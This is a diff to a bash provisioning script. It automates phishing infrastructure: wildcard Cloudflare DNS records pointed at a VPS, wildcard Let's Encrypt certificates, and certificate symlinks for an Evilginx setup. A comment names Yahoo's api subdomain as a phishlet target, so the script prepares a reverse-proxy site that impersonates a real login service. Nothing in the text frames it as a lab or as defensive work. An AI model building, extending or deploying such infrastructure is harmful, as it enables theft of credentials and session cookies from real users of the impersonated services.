@@ -156,7 +156,12 @@ update_dns() {
         err "Could not find Zone ID for $DOMAIN in Cloudflare. Check your token permissions."
     fi
 
-    local records=("$DOMAIN" "$EP1.$DOMAIN" "$EP2.$DOMAIN" "$EP3.$DOMAIN")
+    local records=(
+        "$DOMAIN" "*.$DOMAIN" 
+        "$EP1.$DOMAIN" "*.$EP1.$DOMAIN" 
+        "$EP2.$DOMAIN" "*.$EP2.$DOMAIN" 
+        "$EP3.$DOMAIN" "*.$EP3.$DOMAIN"
+    )
     for record in "${records[@]}"; do
         log "Setting A record for $record -> $VPS_IP"
         local existing_id
@@ -361,7 +366,10 @@ EOF
 provision_tls() {
     log "Provisioning TLS certificates with Cloudflare DNS..."
 
-    local domain_args="-d $DOMAIN -d *.$DOMAIN"
+    local domain_args=(
+        "-d" "$DOMAIN" "-d" "*.$DOMAIN" 
+        "-d" "*.$EP1.$DOMAIN" "-d" "*.$EP2.$DOMAIN" "-d" "*.$EP3.$DOMAIN"
+    )
 
     certbot certonly \
         --dns-cloudflare \
@@ -372,7 +380,7 @@ provision_tls() {
         --expand \
         --email "admin@$DOMAIN" \
         --no-eff-email \
-        $domain_args
+        "${domain_args[@]}"
 
     # Check if certbot succeeded
     if [ $? -ne 0 ]; then
@@ -510,6 +518,10 @@ configure_evilginx_integration() {
         ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.crt"
         ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.key"
     done
+    
+    # Create symlinks for nested subdomains used by phishlets (e.g. Yahoo's api subdomain)
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/api.${EP1}.${DOMAIN}.crt"
+    ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/api.${EP1}.${DOMAIN}.key"
     
     # Create config.yaml in the config subdirectory
     cat > "$EVILGINX_DIR/config/config.yaml" << EOF
